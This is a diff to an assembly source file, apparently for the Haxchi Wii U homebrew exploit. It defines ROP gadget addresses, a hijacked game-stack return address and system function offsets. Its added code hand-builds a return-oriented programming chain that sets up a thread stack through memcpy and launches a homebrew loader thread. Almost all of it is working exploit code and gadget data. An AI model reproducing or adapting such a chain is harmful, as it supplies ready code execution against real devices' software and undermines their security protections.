@@ -1,9 +1,13 @@
-MAIN_STACKTOP equ (0x30796C00)
-CORE0_STACKORIG equ (0x2B267B50) ; TEMP ?
-CORE0_ROPSTART equ (CORE0_STACKORIG + 0xAFC) ; TEMP ?
-RPX_OFFSET equ (0x01800000)
+
+; game stack return address
+hax_target_address equ 0x1076FAA4
+
+; constants for position calcs
 COREINIT_OFFSET equ (- 0xFE3C00)
+RPX_OFFSET equ (0x01800000)
 SYSAPP_OFFSET equ (0x01B75D00)
+
+; rop-gadgets part 1 (used for all sorts of different things)
 LMW_R21R1xC_LWZ_R0R1x3C_MTLR_R0_ADDI_R1_x38_BLR equ (RPX_OFFSET + 0x02208F6C)
 MTCTR_R28_ADDI_R6x68_MR_R5R29_R4R22_R3R21_BCTRL equ (RPX_OFFSET + 0x02208E90)
 BCTRL equ (RPX_OFFSET + 0x02208EA4)
@@ -15,6 +19,17 @@ MR_R11R31_LMW_R26R1x8_LWZ_R0x24_MTLR_R0_ADDI_R1x20_CLRLWI_R3R11x18_BLR equ (RPX_
 LWZ_R0R11x4_R31R11xM4_MTLR_R0_MR_R1R11_BLR equ (RPX_OFFSET + 0x02279BB8)
 MTCTR_R30_MR_R8R21_R7R29_R6R28_R5R27_R4R25_R3R24_BCTRL equ (COREINIT_OFFSET + 0x02002968)
 
+; rop-gadgets part 2 (only used to set up core 0 thread stack)
+LWZ_R3_8_R1_LWZ_R0x14_MTLR_R0_ADDI_R1x10_BLR equ (RPX_OFFSET + 0x0206966C)
+MR_R12_R3_CMPLW_R12_R0_LI_R3_0_BEQ_ADDI_R3_R12x10_LWZ_R0_R1x14_MTLR_R0_ADDI_R1x10_BLR equ (RPX_OFFSET + 0x020A58C4)
+LWZ_R5_R1x8_CMPLW_R5_R31_BNE_MR_R3_R5_LWZ_R0_R1x1C_LWZ_R30_R1x10_MTLR_R0_LWZ_R31_R1x14_ADDI_R1x18_BLR equ (RPX_OFFSET + 0x0200B8D0)
+LWZ_R4_R1xC_STW_R12_R1x8_LWZ_R3_R1x8_LWZ_R0_R1x1C_MTLR_R0_ADDI_R1x18_BLR equ (RPX_OFFSET + 0x0207AD84)
+LWZ_R7_R1x10_LWZ_R8_R1x14_STW_R7_R31x0_STW_R8_R31x0_LWZ_R0_R1x2C_LWZ_R31_R0x24_MTLR_R0_LWZ_R30_R0x20_ADDI_R1x28_BLR equ (RPX_OFFSET + 0x0205182C)
+LWZ_R3_4_R3_LWZ_R0xC_MTLR_R0_ADDI_R1x8_BLR equ (RPX_OFFSET + 0x02014E0C)
+LWZ_R0_R1x1C_LWZ_R30_R1x10_MTLR_R0_LWZ_R31_R1x14_ADDI_R1x18_ADD_R3_R7_BLR equ (RPX_OFFSET + 0x0213FE6C)
+MTCTR_R12_BCTRL_LI_R3_0_LWZ_R0_R1x14_LWZ_R31_R1xC_MTLR_R0_ADDI_R1x10_BLR equ (RPX_OFFSET + 0x0202028C)
+
+; functions used from game and libraries
 NERD_CREATETHREAD equ (RPX_OFFSET + 0x02223C40)
 NERD_STARTTHREAD equ (RPX_OFFSET + 0x0222405C)
 NERD_JOINTHREAD equ (RPX_OFFSET + 0x02223AEC)
@@ -22,7 +37,6 @@ HACHI_APPLICATION_SHUTDOWNANDDESTROY equ (RPX_OFFSET + 0x02007774)
 NERD_FASTWIIU_SHUTDOWN equ (RPX_OFFSET + 0x201BD28)
 CORE_SHUTDOWN equ (RPX_OFFSET + 0x02222FBC)
 _START_EXIT equ (RPX_OFFSET + 0x02022A70)
-HACHI_APPLICATION_PTR equ (0x10A6E038)
 
 _SYSLAUNCHMIISTUDIO equ (SYSAPP_OFFSET + 0x020019D4)
 
@@ -38,10 +52,13 @@ OSSAVESDONE_READYTORELEASE equ (0x0201D5B8 + COREINIT_OFFSET)
 OSRELEASEFOREGROUND equ (0x0201D5BC + COREINIT_OFFSET)
 OSFATAL equ (0x02015218 + COREINIT_OFFSET)
 
+; more useful definitions
 CODEGEN_ADR equ 0x01800000
 
-NERD_THREAD0OBJECT equ (0x1076FAA4 - 0x1000)
-NERD_THREAD2OBJECT equ (0x1076FAA4 - 0x2000)
+HACHI_APPLICATION_PTR equ (0x10A6E038)
+
+NERD_THREAD0OBJECT equ (hax_target_address - 0x1000)
+NERD_THREAD2OBJECT equ (hax_target_address - 0x2000)
 
 .macro set_sp,v
 	.word LWZ_R0R1x14_LWZ_R30R1x8_R31R1xC_MTLR_R0_ADDI_R1x10_BLR
@@ -138,7 +155,7 @@ NERD_THREAD2OBJECT equ (0x1076FAA4 - 0x2000)
 
 
 ; hacked from arm7 ram offset (unsafe, game stack pointer)
-.create "haxchi_rop_hook.bin", 0x1076FAA4
+.create "haxchi_rop_hook.bin", hax_target_address
 .arm.big
 
 rop_hook_start:
@@ -157,7 +174,76 @@ rop_start:
 
 	; set up hbl_loader in core 0
 	call_func_6args NERD_CREATETHREAD, NERD_THREAD0OBJECT, LWZ_R0xAFC_MTLR_R0_ADDI_R1xAF8_BLR, 0x1007E7A8, thread0_param, 0x0, 0x0
-	call_func MEMCPY, CORE0_ROPSTART, core0rop, core0rop_end - core0rop, 0x0
+
+	; the code below prepares the stack for the thread in core 0
+
+	; load memcpy jump into r3
+	.word LWZ_R3_8_R1_LWZ_R0x14_MTLR_R0_ADDI_R1x10_BLR
+		.word MEMCPY ; r3
+		.word 0xDEAD0001 ; garbage
+		.word 0xDEAD0001 ; garbage
+	; more r3 into r12 for our memcpy jump at the end of this
+	.word MR_R12_R3_CMPLW_R12_R0_LI_R3_0_BEQ_ADDI_R3_R12x10_LWZ_R0_R1x14_MTLR_R0_ADDI_R1x10_BLR
+		.word 0xDEAD0001 ; garbage
+		.word 0xDEAD0001 ; garbage
+		.word 0xDEAD0001 ; garbage
+	; prepare r31 to be a valid value for the next call
+	.word LWZ_R0R1x14_LWZ_R30R1x8_R31R1xC_MTLR_R0_ADDI_R1x10_BLR
+		.word 0xDEADBABE ; r30
+		.word (core0rop_end - core0rop) ; r31 (has to be the same as r5 in the next call)
+		.word 0xDEAD0001 ; garbage
+	; get r5 ready for the length we want to copy
+	.word LWZ_R5_R1x8_CMPLW_R5_R31_BNE_MR_R3_R5_LWZ_R0_R1x1C_LWZ_R30_R1x10_MTLR_R0_LWZ_R31_R1x14_ADDI_R1x18_BLR
+		.word (core0rop_end - core0rop) ; r5
+		.word 0xDEAD0001 ; garbage
+		.word 0xDEAD0001 ; r30
+		.word 0xDEAD0001 ; r31
+		.word 0xDEAD0001 ; garbage
+	; get r4 ready for the data we want to copy
+	.word LWZ_R4_R1xC_STW_R12_R1x8_LWZ_R3_R1x8_LWZ_R0_R1x1C_MTLR_R0_ADDI_R1x18_BLR
+		.word 0xDEAD0001 ; garbage
+		.word core0rop ; r4
+		.word 0xDEAD0001 ; garbage
+		.word 0xDEAD0001 ; garbage
+		.word 0xDEAD0001 ; garbage
+	; prepare r31 to be a valid value for the next call
+	.word LWZ_R0R1x14_LWZ_R30R1x8_R31R1xC_MTLR_R0_ADDI_R1x10_BLR
+		.word 0xDEADBABE ; r30
+		.word (0x1076FAA4-0x3000) ; r31 (has to be valid here)
+		.word 0xDEAD0001 ; garbage
+	; loads the required value for the addition onto r3 later on
+	.word LWZ_R7_R1x10_LWZ_R8_R1x14_STW_R7_R31x0_STW_R8_R31x0_LWZ_R0_R1x2C_LWZ_R31_R0x24_MTLR_R0_LWZ_R30_R0x20_ADDI_R1x28_BLR
+		.word 0xDEAD0001 ; garbage
+		.word 0xDEAD0001 ; garbage
+		.word (0x00800000 - 0x30 + 0xAFC) ; r7
+		.word 0xDEAD0001 ; garbage
+		.word 0xDEAD0001 ; garbage
+		.word 0xDEAD0001 ; garbage
+		.word 0xDEAD0001 ; r30
+		.word 0xDEAD0001 ; r31
+		.word 0xDEAD0001 ; garbage
+	; loads pointer to new thread sp into r3
+	.word LWZ_R3_8_R1_LWZ_R0x14_MTLR_R0_ADDI_R1x10_BLR
+		.word (NERD_THREAD0OBJECT+4) ; r3
+		.word 0xDEAD0001 ; garbage
+		.word 0xDEAD0001 ; garbage
+	; r3 contains new thread sp end after this load
+	.word LWZ_R3_4_R3_LWZ_R0xC_MTLR_R0_ADDI_R1x8_BLR
+		.word 0xDEAD0001 ; garbage
+	; r3 contains code injection thread sp after this add
+	.word LWZ_R0_R1x1C_LWZ_R30_R1x10_MTLR_R0_LWZ_R31_R1x14_ADDI_R1x18_ADD_R3_R7_BLR
+		.word 0xDEAD0001 ; garbage
+		.word 0xDEAD0001 ; garbage
+		.word 0xDEAD0001 ; r30
+		.word 0xDEAD0001 ; r31
+		.word 0xDEAD0001 ; garbage
+	; jump to previously prepared r12 for memcpy
+	.word MTCTR_R12_BCTRL_LI_R3_0_LWZ_R0_R1x14_LWZ_R31_R1xC_MTLR_R0_ADDI_R1x10_BLR
+		.word 0xDEAD0001 ; garbage
+		.word 0xDEAD0001 ; r31
+		.word 0xDEAD0001 ; garbage
+
+	; thread stack is prepared after this point
 
 	; wait for hbl_loader to do its job
 	call_func NERD_STARTTHREAD, NERD_THREAD0OBJECT, 0x0, 0x0, 0x0
